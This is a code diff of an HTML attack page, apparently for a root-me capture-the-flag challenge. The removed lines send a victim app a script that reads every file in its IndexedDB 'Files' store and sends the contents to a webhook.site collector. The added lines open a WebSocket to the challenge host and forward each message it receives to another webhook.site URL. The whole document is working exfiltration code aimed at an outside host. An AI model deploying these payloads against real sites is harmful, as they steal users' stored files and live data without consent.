@@ -1,60 +1,23 @@
 <body>
   <script>
-      let a = window.open("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?first=true");
-      let b = window.open("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?second=true");
-      let c = window.open("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?third=true");
 
+    window.WebSocket = window.WebSocket || window.MozWebSocket;
 
-      let x = window.open("http://localhost:1338");
-
-      let payload = `
-      (async () => {
-          const request = indexedDB.open("Files", 1);
-          request.onsuccess = async () => {
-              const db = request.result;
-              const tx = db.transaction(["files", "info"], "readwrite");
-              const filesStore = tx.objectStore("files");
-              const infoStore = tx.objectStore("info");
-      
-              const getAllReq = filesStore.getAll();
-              getAllReq.onsuccess = () => {
-                  const files = getAllReq.result;
-                  files.forEach(fileEntry => {
-                      const reader = new FileReader();
-                      reader.onload = function (e) {
-                          var xhr = new XMLHttpRequest();
-                          xhr.open("GET", encodeURI("https://webhook.site/72641e62-faed-46d8-aff3-f86bdaf30913?vroum=" + e.target.result), false);
-                          xhr.send(null);
-                      };
-                      reader.onerror = function (e) {
-                          console.error('Error reading file:', e);
-                      };
-                      reader.readAsText(fileEntry.file);
-                  });
-                  console.log("All files updated to public.");
-              };
-          };
-      })();
-`
-
+    var connection = new WebSocket('ws://ctf17.root-me.org/ws');  
+    connection.onopen = function () {};  
     
-      let blob = new Blob([`<script>${payload}<` + `/` + `script` + ">"], { type: "text/html" });
-
-      setTimeout(() => {
-        x.postMessage(
-        {
-          type: "share",
-          files: [
-            {
-              blob,
-              cached: false,
-              name: "flag.html",
-            },
-          ],
-        },
-        "*"
-      );
-      }, 5000);
+    connection.onerror = function (error) {
+      fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907?closed=true");
+    };
+    
+    connection.onmessage = function (message) {
+      fetch("https://webhook.site/24c9bc36-e3ee-4e47-bb52-c15d690ec907", {
+        method: "POST",
+        body: JSON.stringify(message)
+      });
+    };
+    
+    connection.onclose = function(message) {};
 
   </script>
 </body>
